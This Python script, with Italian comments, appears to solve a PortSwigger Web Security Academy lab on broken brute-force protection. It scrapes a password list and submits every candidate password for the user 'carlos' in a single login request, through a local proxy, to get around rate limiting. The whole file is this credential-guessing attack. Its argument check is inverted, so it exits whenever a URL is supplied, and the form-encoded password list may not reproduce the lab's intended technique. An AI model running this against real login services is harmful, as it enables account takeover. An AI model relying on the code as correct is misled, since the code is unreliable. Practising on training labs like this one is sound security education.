# https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request

import requests
import sys
from bs4 import BeautifulSoup

if len(sys.argv) != 1:
    print("Usage: solution.py https://actualurl...")
    exit(1)

url = sys.argv[1]

# url da cui prendere l'elenco delle password
password_url = 'https://portswigger.net/web-security/authentication/auth-lab-passwords'
passlist = [] # inizializzo lista vuota
req = requests.get(password_url)
# preparo la zuppa con il body della richiesta di cui sopra (req.text)
soup = BeautifulSoup(req.text, 'html.parser')
# scelgo la classe che mi interessa
passwords = soup.find( class_ = "code-scrollable" ).get_text()
# metto le password in una lista, devo splittare in base al newline e strippare cose
passlist = []
for line in passwords.split('\n'):
    passlist.append(line.strip())

# printo la lista di password
print("Password list:\n")
print(passlist)
print("\n")

# preparo la richiesta di login vera e propria

data = { 'username': 'carlos', 'password': passlist}
headers = { 'Content-Type': 'application/x-www-form-urlencoded' }
proxies = { 'http': 'http://localhost:8080',
            'https': 'http://localhost:8080'
          }
req = requests.post(url, data=data, headers=headers, proxies=proxies)

print(req.status_code)


#req = requests.get(url)
#print(req.text)


